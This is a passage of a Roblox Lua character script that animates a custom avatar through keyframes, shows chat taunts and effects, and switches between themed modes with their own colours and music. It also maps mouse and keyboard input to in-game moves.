Animate(RH,cf(0.8,0.8,-0.2)*angles(math.rad(52.2),math.rad(-11.1),math.rad(31.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.5,0.3)*angles(math.rad(-45.7),math.rad(4),math.rad(-20.7)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.7,1.2,-0.6)*angles(math.rad(64.7),math.rad(22.4),math.rad(32.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(12.2),math.rad(-4.8),math.rad(-22.8)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--GET UP
chatfunc("I have arrived.",25,Derpz_EyeColor,true,"Arcade","Arcade")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .38
Animate(RootJoint,cf(0,-0.5,0.1)*angles(math.rad(-35.9),math.rad(12),math.rad(-6.8))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.4,-0.8)*angles(math.rad(11),math.rad(-0.2),math.rad(-2.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.1,-0.4)*angles(math.rad(39.1),math.rad(-6.2),math.rad(18.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.4,-0.4)*angles(math.rad(39.9),math.rad(-14.9),math.rad(-2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.6,-0.5)*angles(math.rad(48.5),math.rad(4.3),math.rad(-34.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(7.9),math.rad(6.8),math.rad(-11.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 7

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .33
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-6.1),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1.1,-0.5)*angles(math.rad(8.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,-0.2)*angles(math.rad(-6.6),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.6,0)*angles(math.rad(-3.3),math.rad(-2.4),math.rad(-13.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.6,-0.1)*angles(math.rad(-16.5),math.rad(3.5),math.rad(13.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(1.8),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--JUMP

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0.3,0.2)*angles(math.rad(0),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.7,-0.1)*angles(math.rad(0),math.rad(0),math.rad(-4.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.6,-0.2)*angles(math.rad(0),math.rad(0),math.rad(4.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.6,0)*angles(math.rad(0),math.rad(0),math.rad(-10.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.6,0)*angles(math.rad(0),math.rad(0),math.rad(14.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(4.5),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 9

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .5
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(29.9),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.4,0.3)*angles(math.rad(13.1),math.rad(19.8),math.rad(-16.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.3,0.3)*angles(math.rad(19.7),math.rad(-21.1),math.rad(12.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(4.5),math.rad(0),math.rad(-30)),animatetime,easingstyle,easingdir) wait(animatetime+.02)




--Part 2
IntroWing()
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .15
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(31.6),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.4,-0.3,-0.9)*angles(math.rad(126.3),math.rad(37.9),math.rad(40.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.1,0.4,-0.5)*angles(math.rad(86.2),math.rad(44.5),math.rad(-25.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(6.2),math.rad(-0.8),math.rad(-30)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 2

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .2
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(33.9),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.3,-0.3,-0.8)*angles(math.rad(127.5),math.rad(36.8),math.rad(33.7)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1,0.3,-0.8)*angles(math.rad(86.2),math.rad(44.5),math.rad(-25.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(8.4),math.rad(-2),math.rad(-30)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 3

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .18
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(36),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.6,-0.4,-1.1)*angles(math.rad(112.2),math.rad(11.1),math.rad(32.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,-0.3,-0.9)*angles(math.rad(110.9),math.rad(1.6),math.rad(-49.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(10.4),math.rad(-3),math.rad(-29.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 4

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .3
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(39.2),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.4,-0.2,-1.4)*angles(math.rad(112.2),math.rad(11.1),math.rad(32.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,-0.4,-0.8)*angles(math.rad(110.9),math.rad(1.6),math.rad(-60.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(13.6),math.rad(-4.5),math.rad(-29.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
chatfunc("Your demise is inevitable.",15,Derpz_EyeColor,true,"Arcade","Arcade")
--KEYFRAME 5

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .4
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.1,0.6,-1.3)*angles(math.rad(95.5),math.rad(0),math.rad(85.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.6,-1.1)*angles(math.rad(106.4),math.rad(18.1),math.rad(-86.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(15.6),math.rad(-5.6),math.rad(-29.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 6

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.1,0.4,-1.4)*angles(math.rad(112.7),math.rad(0.5),math.rad(85.7)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.3,-1.2)*angles(math.rad(106.9),math.rad(10),math.rad(-86.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(16),math.rad(-5.7),math.rad(-29.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 7

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.1,-1.1)*angles(math.rad(98.5),math.rad(18.4),math.rad(85.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.1,-1.2)*angles(math.rad(93),math.rad(-4.5),math.rad(-87.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(16.3),math.rad(-5.9),math.rad(-29.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 8

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .04
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.2,-1.1)*angles(math.rad(98.1),math.rad(13.2),math.rad(85.9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.3,-1.2)*angles(math.rad(112.7),math.rad(-3.6),math.rad(-86.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(16.5),math.rad(-6),math.rad(-29.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 9

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .08
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.2,-1.1)*angles(math.rad(98.1),math.rad(13.2),math.rad(85.9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.3,-1.1)*angles(math.rad(112.7),math.rad(-3.6),math.rad(-86.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(16.8),math.rad(-6.1),math.rad(-29.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 10

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .14
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.2,-1.1)*angles(math.rad(98.1),math.rad(13.2),math.rad(85.9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.3,-1.1)*angles(math.rad(112.7),math.rad(-3.6),math.rad(-86.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(17.2),math.rad(-6.3),math.rad(-29.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 11

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.3,-1.1)*angles(math.rad(97),math.rad(-1.9),math.rad(86)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.2,-1.2)*angles(math.rad(111.7),math.rad(12.2),math.rad(-86.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(17.6),math.rad(-6.5),math.rad(-29.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 12

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .07
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.3,-1.1)*angles(math.rad(97.8),math.rad(9.6),math.rad(86)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.2,-1.2)*angles(math.rad(94.1),math.rad(1.5),math.rad(-85.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18),math.rad(-6.7),math.rad(-29.3)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 13

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.3,-1.1)*angles(math.rad(97.8),math.rad(9.6),math.rad(86)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.1,-1.2)*angles(math.rad(94.1),math.rad(1.5),math.rad(-85.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18.2),math.rad(-6.8),math.rad(-29.3)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 14

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(41.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(5.4),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.4),math.rad(-14.4),math.rad(1.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,-0.3,-1.1)*angles(math.rad(97.8),math.rad(9.6),math.rad(86)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.1,-1.2)*angles(math.rad(94.1),math.rad(1.5),math.rad(-85.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18.5),math.rad(-6.9),math.rad(-29.3)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 15

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .3
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(0),math.rad(45),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0.3),math.rad(9.3),math.rad(-3.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(1),math.rad(-31.4),math.rad(1.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.2,0.3)*angles(math.rad(3.4),math.rad(10.1),math.rad(-8.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.2,0.3)*angles(math.rad(6.4),math.rad(-25.2),math.rad(7.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(10.9),math.rad(-4.5),math.rad(-37.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
RootPart.Anchored = false

DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 2.5,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(0,0,0),
EndColor = Color3.new(1, 1, 1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(200,.5,200),
Material = "Neon",
Reflectance = 0,
}
)
delay(1.5,function()
chatfunc("Let's get this over with.",20,Derpz_EyeColor,true,"Arcade","Arcade")
end)

attack = false
ModeSwitchLoop({

Name = "Exasperation",
desc = "You're in for a hell of a ride.",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(0,0,0.5),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0.2,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)),
txtg3 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
musicid = 511836626,
musicname = "Desmeon - On That Day",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
end


--MOVES

--Important Removal Stuff
-- Humanoid.Animator.Parent = nil
Humanoid.DisplayDistanceType = "None"
--Important Removal Stuff

--Mode setup
ModeSwitch({

Name = "Exasperation",
desc = "You're in for a hell of a ride.",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(0,0,0.5),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0.2,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)),
txtg3 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
musicid = 511836626,
musicname = "Desmeon - On That Day",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
--Mode setup

APEXRARE = false

--Click, Letter and Number Key Setup + Chat Setup
local attacknumber = 1
local m1c,m2c
m1c=mouse.Button1Down:connect(function()
if not sval.Character() then m1c:Disconnect() return end
if attack == false and attacknumber == 1 then
attacknumber = 2
attackone()
elseif attack == false and attacknumber == 2 then
attacknumber = 3
 attacktwo()
elseif attack == false and attacknumber == 3 then
attacknumber = 4
attackthree()
elseif attack == false and attacknumber == 4 then
attacknumber = 1
attackfour()
end
end)
local AboveHeadGUIDisabled = false
m2c=mouse.KeyDown:connect(function(k)
if not sval.Character() then m2c:Disconnect() return end
if k == "k" and attack == false and AboveHeadGUIDisabled == false then
txt.Enabled = false
AboveHeadGUIDisabled = true
elseif k == "k" and attack == false and AboveHeadGUIDisabled == true then
txt.Enabled = true
AboveHeadGUIDisabled = false
end
if k == "u" and attack == false and EffectsDisabled == false then
EffectsDisabled = true
elseif k == "u" and attack == false and EffectsDisabled == true then
EffectsDisabled = false
end
if k == "l" and muted == false then
muted = true
--chatfunc("Muted.",10,BrickColor.new("Really red").Color)
DerpzMusic.Volume = 0
elseif k == "l" and muted == true then
muted = false
--chatfunc("Unmuted.",10,BrickColor.new("Bright green").Color)
DerpzMusic.Volume = 1.25
end
if k == "t" and attack == false then
TauntFunction(ModeOfCharacter)
end
if k == "[" and attack == false then
unzip()
end
if k == "z" and attack == false and ModeOfCharacter == "Exasperation" then
HeartCrushd()
end
if k == "x" and attack == false and ModeOfCharacter == "Exasperation" then
MayhemRipoff()
end
if k == "z" and attack == false and ModeOfCharacter == "Demented" then
NeckSnap()
end
if k == "z" and attack == false and ModeOfCharacter == "Inflamed" then
zoooooooom()
end
if k == "x" and attack == false and ModeOfCharacter == "Demented" then
OrbMadness()
end
if k == "x" and attack == false and ModeOfCharacter == "Atmospherical" then
WEEEEEEEEEEEEE()
end
if k == "z" and attack == false and ModeOfCharacter == "Atmospherical" then
FlyMode()
end
if k == "1" and attack == false and ModeOfCharacter ~= "Exasperation" then
--ModeChangeExp()
ModeChangeStart(Color3.new(1,0,0),Color3.new(0,0,1))
rdm = math.random(1,5)
if rdm == 1 then
APEXRARE = false
ModeSwitch({

Name = "Derpz...?",
desc = "A mix betwe- HEY, WAIT WE STOPPED DOING THAT",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(0,0,0.5),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0.2,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)),
txtg3 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
musicid = 250185257,
musicname = "Excision & Pegboard Nerds - Bring The Madness (Noisestorm Remix)",
musicpit = 1.05,
musicvol = 1,
musicpos = 0,
ws = 16,
jp = 100,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
elseif rdm == 5 then
APEXRARE = true
soundeffect(819341264,1,tors,1,0,"...Asari?")
ModeSwitch({

Name = "APEX",
desc = "ORIGINALITY: LAST★STAR|You're a goner, man.",
font = "Antique",
modestring = "Exasperation",
wcol1 = Color3.new(1,0,0),
wcol2 = Color3.new(0,0,0),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,0),
eyecol1 = Color3.new(1,0,0),
eyecol2 = Color3.new(1,0,0),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "Galaxy",
txtg1 = ColorSequence.new(Color3.new(0,0,0.2),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,0.2)),
txtg3 = ColorSequence.new(Color3.new(0,0,.2),Color3.new(1,0,0)),
musicid = 6454152476,
musicname = "Srav3R - Bomb The Rave (feat. Numb'n'dub)",
musicpit = 1,
musicvol = 2,
musicpos = 0,
ws = 16,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
local apexlines = {"Waste of time.","Get out of my way.","Mere mortals.","This feels unusual.","Am I meant to be here?","Your life shall come to a close.","I feel different.","Glitcher collison.","Wait a minute, Aren't I meant to be a bee?"}
chatfunc(apexlines[math.random(1,#apexlines)],20,Color3.new(1,0,0),true,"Arcade","Arcade")
else
APEXRARE = false
ModeSwitch({

Name = "Exasperation",
desc = "You're in for a hell of a ride.",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(0,0,0.5),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0.2,
WingMat1 = Enum.Material.Neon,
